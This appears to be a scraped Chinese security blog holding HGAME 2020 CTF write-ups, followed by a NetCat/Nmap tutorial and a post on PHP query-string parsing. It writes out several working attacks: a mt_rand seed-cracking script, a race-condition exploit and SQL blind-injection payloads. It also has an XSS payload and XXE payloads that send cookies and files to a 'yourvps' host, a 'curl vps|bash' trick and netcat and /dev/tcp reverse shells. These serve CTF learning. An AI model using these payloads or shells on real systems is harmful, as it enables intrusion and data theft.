123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219#!/usr/bin/env python3.7# Charles Fol# @cfreal_# 2020-01-04 (originally la long time ago ~ 2010)# Breaking mt_rand() with two output values and no bruteforce.#&quot;&quot;&quot;R = final rand valueS = merged state values = original state value&quot;&quot;&quot;import randomimport sysN = 624M = 397MAX = 0xffffffffMOD = MAX + 1# STATE_MULT * STATE_MULT_INV = 1 (mod MOD)STATE_MULT = 1812433253STATE_MULT_INV = 2520285293MT_RAND_MT19937 = 1MT_RAND_PHP = 0def php_mt_initialize(seed): &quot;&quot;&quot;Creates the initial state array from a seed. &quot;&quot;&quot; state = [None] * N state[0] = seed &amp; 0xffffffff; for i in range(1, N): r = state[i-1] state[i] = ( STATE_MULT * ( r ^ (r &gt;&gt; 30) ) + i ) &amp; MAX return statedef undo_php_mt_initialize(s, p): &quot;&quot;&quot;From an initial state value `s` at position `p`, find out seed. &quot;&quot;&quot; # We have: # state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000 # and: # (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse) # =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000) for i in range(p, 0, -1): s = _undo_php_mt_initialize(s, i) return sdef _undo_php_mt_initialize(s, i): s = (STATE_MULT_INV * (s - i)) &amp; MAX return s ^ s &gt;&gt; 30def php_mt_rand(s1): &quot;&quot;&quot;Converts a merged state value `s1` into a random value, then sent to the user. &quot;&quot;&quot; s1 ^= (s1 &gt;&gt; 11) s1 ^= (s1 &lt;&lt; 7) &amp; 0x9d2c5680 s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000 s1 ^= (s1 &gt;&gt; 18) return s1def undo_php_mt_rand(s1): &quot;&quot;&quot;Retrieves the merged state value from the value sent to the user. &quot;&quot;&quot; s1 ^= (s1 &gt;&gt; 18) s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000 s1 = undo_lshift_xor_mask(s1, 7, 0x9d2c5680) s1 ^= s1 &gt;&gt; 11 s1 ^= s1 &gt;&gt; 22 return s1def undo_lshift_xor_mask(v, shift, mask): &quot;&quot;&quot;r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask) &quot;&quot;&quot; for i in range(shift, 32, shift): v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i return vdef bits(v, start, size): return lobits(v &gt;&gt; start, size)def lobits(v, b): return v &amp; ((1 &lt;&lt; b) - 1)def bit(v, b): return v &amp; (1 &lt;&lt; b)def bv(v, b): return bit(v, b) &gt;&gt; bdef php_mt_reload(state, flavour): s = state for i in range(0, N - M): s[i] = _twist_php(s[i+M], s[i], s[i+1], flavour) for i in range(N - M, N - 1): s[i] = _twist_php(s[i+M-N], s[i], s[i+1], flavour)def _twist_php(m, u, v, flavour): &quot;&quot;&quot;Emulates the `twist` and `twist_php` #defines. &quot;&quot;&quot; mask = 0x9908b0df if (u if flavour == MT_RAND_PHP else v) &amp; 1 else 0 return m ^ (((u &amp; 0x80000000) | (v &amp; 0x7FFFFFFF)) &gt;&gt; 1) ^ maskdef undo_php_mt_reload(S000, S227, offset, flavour): #define twist_php(m,u,v) (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU)) # m S000 # u S227 # v S228 X = S000 ^ S227 # This means the mask was applied, and as such that S227&#x27;s LSB is 1 s22X_0 = bv(X, 31) # remove mask if present if s22X_0: X ^= 0x9908b0df # Another easy guess s227_31 = bv(X, 30) # remove bit if present if s227_31: X ^= 1 &lt;&lt; 30 # We&#x27;re missing bit 0 and bit 31 here, so we have to try every possibility s228_1_30 = (X &lt;&lt; 1) for s228_0 in range(2): for s228_31 in range(2): if flavour == MT_RAND_MT19937 and s22X_0 != s228_0: continue s228 = s228_0 | s228_31 &lt;&lt; 31 | s228_1_30 # Check if the results are consistent with the known bits of s227 s227 = _undo_php_mt_initialize(s228, 228 + offset) if flavour == MT_RAND_PHP and bv(s227, 0) != s22X_0: continue if bv(s227, 31) != s227_31: continue # Check if the guessed seed yields S000 as its first scrambled state rand = undo_php_mt_initialize(s228, 228 + offset) state = php_mt_initialize(rand) php_mt_reload(state, flavour) if not (S000 == state[offset]): continue return rand return Nonedef main(_R000, _R227, offset, flavour): # Both were &gt;&gt; 1, so the leftmost byte is unknown _R000 &lt;&lt;= 1 _R227 &lt;&lt;= 1 for R000_0 in range(2): for R227_0 in range(2): R000 = _R000 | R000_0 R227 = _R227 | R227_0 S000 = undo_php_mt_rand(R000) S227 = undo_php_mt_rand(R227) seed = undo_php_mt_reload(S000, S227, offset, flavour) if seed: return seeddef test_do_undo(do, undo): for i in range(10000): rand = random.randrange(1, MAX) done = do(rand) undone = undo(done) if not rand == undone: print(f&quot;-- &#123;i&#125; ----&quot;) print(bin(rand).rjust(34)) print(bin(undone).rjust(34)) breakdef test(): test_do_undo( php_mt_initialize, lambda s: undo_php_mt_initialize(s[227], 227) ) test_do_undo( php_mt_rand, undo_php_mt_rand ) exit()# test()import requestsimport jsonurl = &quot;https://twoshot.hgame.n3ko.co/&quot;req = requests.session()r = req.get(url+&quot;random.php?times=228&quot;)# print(r.content)data = json.loads(r.text)seed = main(data[0], data[len(data)-1], 0, 0)r = req.post(url+&quot;verify.php&quot;, data=&#123;&quot;ans&quot;:seed&#125;)print(r.text) exp中的main函数，第一个参数是某个随机数的值，第二个参数是与这个随机数相隔226个随机数的随机数的值，第三个参数是这个随机数前面随机数的个数，第四个参数是php的版本，0代表php5，1代表php7 Cosmos的二手市场题目考察的是条件竞争，真没想到,exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import threadingimport requestsimport jsonimport timedef worker(i,data): if i%2==0: url=&quot;&#123;&#125;?method=solve&quot;.format(host) else: url=&quot;&#123;&#125;?method=buy&quot;.format(host) try: s.post(url=url,data=data) except: print(&quot;请求失败&quot;) returnhost=&quot;http://121.36.88.65:9999/API/&quot;user=&#123;&quot;name&quot;:&quot;roc&quot;,&quot;password&quot;:&quot;123456&quot;&#125;s=requests.session()s.post(url=&quot;&#123;&#125;?method=login&quot;.format(host),data=user)i=1while True: data=&#123; &quot;code&quot;:&#x27;800001&#x27;, &quot;amount&quot;:&#x27;500&#x27; &#125; info=json.loads(s.get(&quot;&#123;&#125;?method=getinfo&quot;.format(host)).text) money=info[&#x27;data&#x27;][&#x27;money&#x27;] properties=info[&#x27;data&#x27;][&#x27;properties&#x27;] print(money) print(properties) if money&gt;100000000: print(s.get(&quot;&#123;&#125;?method=getflag&quot;.format(host)).text) break if i%2==0: amount=int(properties[0][&#x27;amount&#x27;]) else: amount=money//10000 if amount&gt;500: amount=500 data[&#x27;amount&#x27;]=amount for j in range(30): t=threading.Thread(target=worker,args=(i,data)) t.start() time.sleep(5) i+=1 Cosmos的留言板-2按照留言板1，猜测这题就是sql注入，最后在删除的位置存在盲注 直接用sqlmap跑出来了😂 payload: 123method=delete&amp;delete_id=(CASE WHEN (5147=5147) THEN SLEEP(5) ELSE 5147 END)举个例子：(CASE WHEN (ORD(MID((SELECT IFNULL(CAST(name AS CHAR),0x20) FROM babysql.`user` ORDER BY id LIMIT 3,1),5,1))&gt;47) THEN SLEEP(4) ELSE 6131 END) Cosmos的聊天室2.0这道题试了好久，后来才发现有CSP 1Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; 它限制了内联 JS 脚本，并且限制了引⼊的静态资源⽂件只能从同域下加载。在实际应⽤中，遇到这种CSP⼀般是找该站是否有⽂件上传点，也可以同源下有没有可以执⾏任意 JS 代码的 evil.js ⽂件 题目的过滤很简单，双写就可以绕过，题目有个接⼝/send，它会返回过滤后的消息内容，并且是GET请求方式，所以可以构造下面的payload: 1&lt;scriscriptpt src=&quot;/send?message=window.open(&#x27;http://yourvps/?&#x27;%2bdocument.cookie)&quot;&gt;&lt;/scscriptript&gt; 注意+号要url编码为%2b misc美 人 鲸这题是个docker镜像，先pull下来 然后运行并进入容器 1docker run -t -i 31ab18768617 /bin/sh 搜索一下文件 1find / -name flag* 找到/usr/share/man/man8/flag.tar.gz，先拷贝出来 1docker cp ba61f2585d31:/usr/share/man/man8/flag.tar.gz /home/ubuntu/Desktop/ #字符串为容器id 解压发现README里有See sh history.，再进入容器 发现再/root目录下有.ash_history文件 里面有echo -e &quot;Zip password is somewhere else in /etc.\\nFind it!&quot; 提示我们zip密码再/etc下 1grep -rn &quot;Zip&quot; /etc -r是递归方式查找目录，-n显示行号 在issue文件找到zip密码，Zip Password: cfuzQ3Gd6gqKG@$N 解压得到flag.db，直接记事本或者Navicat查看得到flag 三重隐写解压附件，You know LSB.wav，猜测wav的lsb隐写，可以直接用工具SilentEye 下载链接：https://silenteye.v1kings.io/download.html?i2 得到：Stegano key: uFSARLVNwVIewCY5 试了试，发现上裏与手抄卷.mp3是MP3Stego隐写，密码是我们之间得到的 得到：Zip Password: VvLvmGjpJ75GdJDP 解压压缩包得到flag.crypto，安装附件中的工具，发现需要密码 对于Unlasting.mp3，使用foremost分离出一张png图片，binwalk好像分离不出来 是Pdf417的二维码扫码，在线网址：https://online-barcode-reader.inliteresearch.com/[](https://online-barcode-reader.inliteresearch.com/) 用EncryptoforWin.exe输入密码解密即可得flag 日常三个文件，Blind.png，Origin_pixivArtwork75992170.png，橫豎撇點折_av85002656.ogg 两张图片相同，猜测是盲水印，直接用bwm，地址：https://github.com/chishaxie/BlindWaterMark 1python bwm.py decode Blind.png Origin_pixivArtwork75992170.png flag.png 好像看不太清，用StegSolve切换一下 内容为：VeraCrypt Password is X0YA1GDuZF$echCy 橫豎撇點折_av85002656.oggbinwalk分离出一个Container文件，用VeraCrypt解密 然后发现有三个文件 和3ctf流量分析题相似，参考：http://www.gtfly.top/2019/11/18/记一次-冰蝎-一句话木马流量分析.[html](http://www.gtfly.top/2019/11/18/记一次-冰蝎-一句话木马流量分析.html) Cookies文件是从Chrome浏览器导出的文件，在保存时，Chrome先将密码进行DPAPI加密，再保存在SQLite数据库文件中，因此这是一个SQLite数据库文件 再介绍几个概念： chrome33以上对Cookies进行了加密，value变为空，增加了加密的encrypted_value字段，字段类型是BLOB，这个便是我们需要解密的内容 Master Key： 64字节，用于解密DPAPI BLOB 通过用户登录密码、SID和16字节随机数加密后保存在Master Key file中 Master Key file： 二进制文件，可使用用户登录密码对其解密，获得Master Key SID（Security Identifiers，SID）： 安全标识符，是标识用户、组和计算机帐户的唯一的号码。在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的 SID。Windows 2000 中的内部进程将引用帐户的 SID 而不是帐户的用户或组名。如果创建帐户，再删除帐户，然后使用相同的用户名创建另一个帐户，则新帐户将不具有授权给前一个帐户的权力或权限，原因是该帐户具有不同的 SID 号。 ObjectNF-PC.txt是mimikatz导出的结果，密码我们能解出来 我们现在先导出BLOB 然后用Windows Password Recovery 选择导出要解密的BLOB 选择Master Key file，即S-1-5-21-3375469711-1363829938-1291733684-1001.zip压缩包中的文件，这个文件好像没法在文件夹里显示，只需复制文件名，会自动匹配文件 填写SID和密码 得到flag 智械危机（#1)服务端程序： 123456789101112131415161718192021222324252627import numpy as nptrue_flag = &#x27;hgame&#123;&#125;&#x27;flag = np.loadtxt(&#x27;flag.txt&#x27;)threshold = 0.18def mse(true, predict): return np.average(np.abs(true - predict))def judge(predict): if mse(flag, predict) &lt; threshold: print(true_flag) else: print(&quot;Unfortunately! Your mse loss is over the threshold, try again!&quot;) print(&quot;Wrong flag!&quot;)if __name__ == &quot;__main__&quot;: print(&quot;Welcome to this game!&quot;) print(&quot;Please input your flag here (separated by space please):&quot;) inp=input() try: inp = np.asarray(inp.split(&#x27; &#x27;), dtype=float) judge(inp) except Exception as e: print(&quot;Internal Error!&quot;) exp: 1234567891011121314151617181920212223242526import numpy as npimport keras.models as modelsimport tensorflow as tfmodel = models.load_model(&#x27;flag.hdf5&#x27;)# model.summary()weights = model.get_layer(index=1).get_weights()W = weights[0]b = weights[1]y = np.loadtxt(&#x27;enc_flag.txt&#x27;)W_data = tf.placeholder(tf.float32, [128, 64])target = tf.placeholder(tf.float32, [64])X_op = tf.Variable(tf.truncated_normal([1, 128]))pred = tf.matmul(tf.sigmoid(X_op), W_data)loss = tf.reduce_mean(tf.abs(target - pred))optimizer = tf.train.AdamOptimizer(learning_rate=1e-3)train_op = optimizer.minimize(loss)with tf.Session() as sess: sess.run(tf.global_variables_initializer()) for i in range(10000): _, loss_value = sess.run([train_op, loss],feed_dict=&#123;W_data: W, target: y - b&#125;) if i % 100 == 0: print(i, loss_value) result = np.array(sess.run(X_op)) result[result &gt; 0.5] = 1 result[result &lt; 0.5] = 0 Week4web代打出题人服务中心不难发现是XXE payload: 123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://yourvps/exp1.dtd&quot;&gt;%remote;%int;%send;]&gt;&lt;msg&gt;&lt;id&gt;moonback&lt;/id&gt;&lt;name&gt;aasd&lt;/name&gt;&lt;level&gt;1000&lt;/level&gt;&lt;time&gt;415441&lt;/time&gt;&lt;/msg&gt; vps上： 12&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;yourvps:9001?p&#x3D;%file;&#39;&gt;&quot;&gt; 服务器监听9001端口就可以读文件了，读取/etc/hosts 12345678127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.21.0.76 hgame-private172.21.0.31 f9f1b9b99e13 发现172.21.0.76比较特殊，试着访问，这里有个tips: 当使⽤ libxml 读取⽂件内容的时候，⽂件不能过⼤，如果太⼤就会报错⽆法得到⽂件内容，因此需要使⽤ php过滤器的⼀个压缩的⽅法zlib.deflflate 所以vps上构造： 12&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;172.21.0.76&#x2F;?token&#x3D;12335565&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;yourvps:9001?p&#x3D;%file;&#39;&gt;&quot;&gt; 然后我们就能得到压缩后的东西，只需 12&lt;?phpinclude(&#x27;php://filter/read=convert.base64-decode/zlib.inflate/resource=a&#x27;); 就能得到源码： 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);$token = @$_GET[&#x27;token&#x27;];if (!isset($token)) &#123; die(&quot;请带上您的队伍token访问! /?token=&quot;);&#125;$api = &quot;http://checker/?token=&quot;.$token;$t = file_get_contents($api);if($t !== &quot;ok&quot;) &#123; die(&quot;队伍token错误&quot;);&#125;highlight_file(__FILE__);$sandbox = &#x27;/var/www/html/sandbox/&#x27;. md5(&quot;hgame2020&quot; . $token);;@mkdir($sandbox);@chdir($sandbox);$content = $_GET[&#x27;v&#x27;];if (isset($content)) &#123; $cmd = substr($content,0,5); system($cmd);&#125;else if (isset($_GET[&#x27;r&#x27;])) &#123; system(&#x27;rm -rf ./*&#x27;);&#125;/* _____ _ _ ______ _ _ _____ ______ _______ _____ _______ _ / ____| | | | ____| | | | / ____| ____|__ __| |_ _|__ __| | | | (___ | |__| | |__ | | | | | | __| |__ | | | | | | | | \\___ \\| __ | __| | | | | | | |_ | __| | | | | | | | | ____) | | | | |____| |____| |____ | |__| | |____ | | _| |_ | | |_| |_____/|_| |_|______|______|______( )_____|______| |_| |_____| |_| (_) |/*/ 可以看出来是限制5字符的命令执行，由于没有说flflag在哪，因此需要反弹shell⽅便找flag的位置 在linux中，⼀条命令可以通过符号 \\ 分割为多⾏不影响执⾏结果。如 123456ubuntu:~# cat testec\\ho \\hello!ubuntu:~# sh testhello! 因此我们可以利⽤这个特性，将超⻓的命令分割为多段来执⾏。 为了让服务器记住我们先前所输⼊的命令⽚段，我们可以利⽤重定向符 &gt; &gt;&gt; 来在当前⽬录创建⽂件。 ⽂件名即为我们所需的命令⽚段。 为了让创建的⽂件按照我们想要的顺序排列，可以使⽤ ls -t 使得⽂件按照创建时间先后排序。 ⽽ ls -t&gt;a 超⻓度限制，因此我们需要⽤ ls&gt;_ 来构造出 ls -t&gt;a 123456&gt;ls\\\\ #写ls\\文件，会转义所以用两个ls&gt;_ #列举文件，将ls\\写入_文件&gt;\\ \\\\ #写空格\\文件&gt;-t\\\\ #写-t\\文件&gt;》&gt;\\&gt;y #写&gt;y文件ls&gt;&gt;_ #将文件名追加到_文件内 反弹shell直接用bash反弹 1bash -i &gt;&amp; /dev/tcp/0.0.0.0/2333 0&gt;&amp;1 这段不太容易构造，因此我们可以构造 12345678910111213curl vps|bash&gt;bash&gt;\\|\\\\&gt;0\\\\&gt;0.\\\\&gt;0.\\\\&gt;0.\\\\&gt;\\ \\\\&gt;rl\\\\&gt;cu\\\\sh _sh y 然后就可以弹shell拿flag了 也可以写个脚本，服务器上放个php，接收post过来的dtd并存在文件中，注意： 命令要用原生字符串 注意生成的文件有重复的没(我的服务器ip会生成两个7.文件，然后一直弹不了shell,没办法只能用域名了)","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"HAGAME","slug":"HAGAME","permalink":"http://www.moonback.xyz/tags/HAGAME/"}]},{"title":"NetCat,Nmap,WireShack工具使用","slug":"nc-nmap和wireshack使用","date":"2020-01-23T07:31:05.000Z","updated":"2020-02-04T14:14:35.901Z","comments":true,"path":"2020/01/23/nc-nmap和wireshack使用/","link":"","permalink":"http://www.moonback.xyz/2020/01/23/nc-nmap%E5%92%8Cwireshack%E4%BD%BF%E7%94%A8/","excerpt":"本篇博客主要介绍了NetCat,Nmap,WireShack三个工具使用详情！","text":"本篇博客主要介绍了NetCat,Nmap,WireShack三个工具使用详情！ NetCat常用参数1234567891011121314-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个；-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数；-h：帮助；-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口；-l：使用监听模式，监控传入的资料；-n：直接使用ip地址，而不通过域名服务器；-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；-p&lt;通信端口&gt;：设置本地主机使用的通信端口；-r：指定源端口和目的端口都进行随机的选择；-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址；-u：使用UDP传输协议；-v：显示指令执行过程；-w&lt;超时秒数&gt;：设置等待连线的时间；-z：使用0输入&#x2F;输出模式，只在扫描通信端口时使用 远程控制正向12被控端：nc -lp 333 -c bash攻击端：nc 1.1.1.1 333 反向12被控端：nc 1.1.1.1 333 -c bash攻击端：nc -lp 333 注：Windows⽤户把bash改成cmd 传输文件也有两种方式 方式1： 12接收端：nc -lp 333 &gt; 1.mp4发送端：nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1 方式2： 12接收端：nc -nv 1.1.1.1 333 &gt; a.mp4发送端：nc -q 1 -lp 333 &lt; a.mp4 传输目录 12发送端：tar -cvf - music/ | nc -lp 333 –q 1接收端：nc -nv 1.1.1.1 333 | tar -xvf - 注意有个- 端口扫描1nc -nvz 1.1.1.1 1-100 n 参数作用是跟 ip 地址，不做 dns 域名解析,v 参数是显示详细信息。z 参数就是扫描模式，默认就是 tcp 全链接扫描。 NmapNmap 参数详解Nmap支持主机名,ip,网段的表示方式 例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254 1234-iL filename 从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段-iR hostnum 随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描--exclude host1[, host2] 从扫描任务中需要排除的主机 --exculdefile exclude_file 排除文件中的IP,格式和-iL指定扫描文件的格式相同 主机发现 1234567-sL 仅仅是显示,扫描的IP数目,不会进行任何扫描-sn ping扫描,即主机发现-Pn 不检测主机存活-PS/PA/PU/PY[portlist] TCP SYN Ping/TCP ACK Ping/UDP Ping发现-PE/PP/PM 使用ICMP echo, timestamp and netmask 请求包发现主机-PO[prococol list] 使用IP协议包探测对方主机是否开启 -n/-R 不对IP进行域名反向解析/为所有的IP都进行域名的反响解析 扫描技巧 12345678-sS/sT/sA/sW/sM TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描-sU UDP扫描-sN/sF/sX TCP Null，FIN，and Xmas扫描--scanflags 自定义TCP包中的flags-sI zombie host[:probeport] Idlescan-sY/sZ SCTP INIT/COOKIE-ECHO 扫描-sO 使用IP protocol 扫描确定目标机支持的协议类型-b “FTP relay host” 使用FTP bounce scan 指定端口和扫描顺序 123456-p 特定的端口 -p80,443 或者 -p1-65535-p U:PORT 扫描udp的某个端口, -p U:53-F 快速扫描模式,比默认的扫描端口还少-r 不随机扫描端口,默认是随机扫描的--top-ports &quot;number&quot; 扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于&#x2F;usr&#x2F;share&#x2F;nmap.nmap默认扫前1000个--port-ratio &quot;ratio&quot; 扫描指定频率以上的端口 服务版本识别 12345-sV 开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测--version-intensity &quot;level&quot; 设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7--version-light 打开轻量级模式,为--version-intensity 2的别名--version-all 尝试所有探测,为--version-intensity 9的别名--version-trace 显示出详细的版本侦测过程信息 脚本扫描 1234567-sC 根据端口识别的服务,调用默认脚本--script&#x3D;”Lua scripts” 调用的脚本名--script-args&#x3D;n1&#x3D;v1,[n2&#x3D;v2] 调用的脚本传递的参数--script-args-file&#x3D;filename 使用文本传递参数--script-trace 显示所有发送和接收到的数据--script-updatedb 更新脚本的数据库--script-help&#x3D;”Lua script” 显示指定脚本的帮助 OS识别 123-O 启用操作系统检测,-A来同时启用操作系统检测和版本检测--osscan-limit 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)--osscan-guess 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配 防火墙/IDS躲避和哄骗 123456789101112-f; --mtu value 指定使用分片、指定数据包的MTU.-D decoy1,decoy2,ME 使用诱饵隐蔽扫描-S IP-ADDRESS 源地址欺骗-e interface 使用指定的接口-g&#x2F; --source-port PROTNUM 使用指定源端口 --proxies url1,[url2],... 使用HTTP或者SOCKS4的代理 --data-length NUM 填充随机数据让数据包长度达到NUM--ip-options OPTIONS 使用指定的IP选项来发送数据包--ttl VALUE 设置IP time-to-live域--spoof-mac ADDR&#x2F;PREFIX&#x2F;VEBDOR MAC地址伪装--badsum 使用错误的checksum来发送数据包 Nmap 输出 1234567891011121314151617-oN 将标准输出直接写入指定的文件-oX 输出xml文件-oS 将所有的输出都改为大写-oG 输出便于通过bash或者perl处理的格式,非xml-oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出-v 提高输出信息的详细度-d level 设置debug级别,最高是9--reason 显示端口处于带确认状态的原因--open 只输出端口状态为open的端口--packet-trace 显示所有发送或者接收到的数据包--iflist 显示路由信息和接口,便于调试--log-errors 把日志等级为errors&#x2F;warings的日志输出--append-output 追加到指定的文件--resume FILENAME 恢复已停止的扫描--stylesheet PATH&#x2F;URL 设置XSL样式表，转换XML输出--webxml 从namp.org得到XML的样式--no-sytlesheet 忽略XML声明的XSL样式表 其他nmap选项 12345678-6 开启IPv6-A OS识别,版本探测,脚本扫描和traceroute--datedir DIRNAME 说明用户Nmap数据文件位置--send-eth &#x2F; --send-ip 使用原以太网帧发送&#x2F;在原IP层发送--privileged 假定用户具有全部权限--unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限-V 打印版本信息-h 输出帮助 端口状态 open：确定端口开放，可达 closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。 unfiltered ：未被过滤状态意味着端口可访问，但是Nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。 open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。 closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的 扫描技术 -sS/sT/sA/sW/sM:TCP扫描 S是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放 T是全连接扫描会和服务器建立完整的三次握手，效率低 A发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件 W 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包 M是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准 -sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文 -sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。 –scanflags &lt;flags&gt;：实现上同上面几种类似，可以让用户自定义TCP标志位。 -sI &lt;zombie host[:probeport]&gt;: Idle扫描需要一台没有流量的僵尸主机，这种扫描的实现原理是在一定的时间里，同一台主机发出的IP数据报文其ip头中的identification字段是累加的。探测分为3步：1、Nmap主机向僵尸机发包，通过僵尸机的响应包探测其ID；2、Nmap主机伪造僵尸机源地址向服务器的特定端口发送SYN包；3、Nmap主机再次探测僵尸机的ip.id。如果目标服务器端口开放，则必然会向僵尸机发送SYN/ACK，由于莫名其妙收到一个SYN/ACK 报文，僵尸机会向目标服务器发送RST报文，该报文的ip.id 是第一步+1，则第三步Nmap主机探测到的ip.id应该是第一步+2，说明目标主机端口开放。反之，如果目标主机端口未开放，则收到第二步的报文后会向僵尸机回复RST或者直接丢弃该报文不响应，无论哪种情况，都不会触发僵尸机发包，进而僵尸机的ip.id不会变化，第三步Nmap探测到的id应该是第一步+1. -sY/sZ:SCTP协议INIT或cookie-echo扫描 -sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测 -b &lt;FTP relay host&gt;:：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的 WireShark参考：https://www.cnblogs.com/mq0036/p/11187138.html","categories":[],"tags":[{"name":"NetCat","slug":"NetCat","permalink":"http://www.moonback.xyz/tags/NetCat/"},{"name":"Nmap","slug":"Nmap","permalink":"http://www.moonback.xyz/tags/Nmap/"},{"name":"WireShack","slug":"WireShack","permalink":"http://www.moonback.xyz/tags/WireShack/"}]},{"title":"PHP的字符串解析特性","slug":"PHP的字符串解析特性","date":"2020-01-17T11:18:30.000Z","updated":"2020-02-12T09:49:02.018Z","comments":true,"path":"2020/01/17/PHP的字符串解析特性/","link":"","permalink":"http://www.moonback.xyz/2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/","excerpt":"本篇博客主要介绍了PHP的字符串解析特性相关内容！","text":"本篇博客主要介绍了PHP的字符串解析特性相关内容！ PHP的字符串解析特性 PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事： 删除空白符 将某些字符转换为下划线(包括空格) php解析变量是用parse_str()来解析的，关于这个函数的详细用法参见：https://www.php.net/parse_str 删除空白符这个很好理解，先看道ctf题目: 再说下将某些字符转换为下划线这个特性吧，还是先看一道题吧！ 奇怪的恐龙特性题目源码： 123456789101112131415161718&lt;?php highlight_file(__FILE__); ini_set(&quot;display_error&quot;, false); error_reporting(0); $str = isset($_GET[&#x27;A_A&#x27;])?$_GET[&#x27;A_A&#x27;]:&#x27;A_A&#x27;; if (strpos($_SERVER[&#x27;QUERY_STRING&#x27;], &quot;A_A&quot;) !==false) &#123; echo &#x27;A_A,have fun&#x27;; &#125; elseif ($str&lt;9999999999) &#123; echo &#x27;A_A,too small&#x27;; &#125; elseif ((string)$str&gt;0) &#123; echo &#x27;A_A,too big&#x27;; &#125; else&#123; echo file_get_contents(&#x27;flag.php&#x27;); &#125; ?&gt; 首先在请求的url后面不能有A_A，并且要不满足下面两个比较条件 所以，我们可以构造下面的payload: 1?A A[]&#x3D;a php会将A A解析成A_A，数组大于任何数字，对数组强制string类型转换会转换成a，a和0比较时，a会转换为整型即0 用户输入 解析前 解析后变量名 %20foo_bar%00 foo_bar foo_bar foo%20bar%00 foo 